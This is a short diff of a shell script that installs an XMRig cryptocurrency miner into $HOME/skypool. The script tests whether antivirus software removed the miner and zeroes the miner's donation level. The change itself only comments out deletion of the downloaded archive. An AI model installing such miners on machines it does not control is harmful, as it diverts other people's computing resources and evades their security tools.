@@ -175,7 +175,7 @@ if ! tar xf /tmp/xmrig.tar.gz -C $HOME/skypool; then
   echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/skypool directory"
   exit 1
 fi
-rm /tmp/xmrig.tar.gz
+# rm /tmp/xmrig.tar.gz
 
 echo "[*] Checking if advanced version of $HOME/skypool/xmrig works fine (and not removed by antivirus software)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/skypool/config.json
@@ -201,7 +201,7 @@ if (test $? -ne 0); then
   if ! tar xf /tmp/xmrig.tar.gz -C $HOME/skypool --strip=1; then
     echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/skypool directory"
   fi
-  rm /tmp/xmrig.tar.gz
+  # rm /tmp/xmrig.tar.gz
 
   echo "[*] Checking if stock version of $HOME/skypool/xmrig works fine (and not removed by antivirus software)"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/skypool/config.json
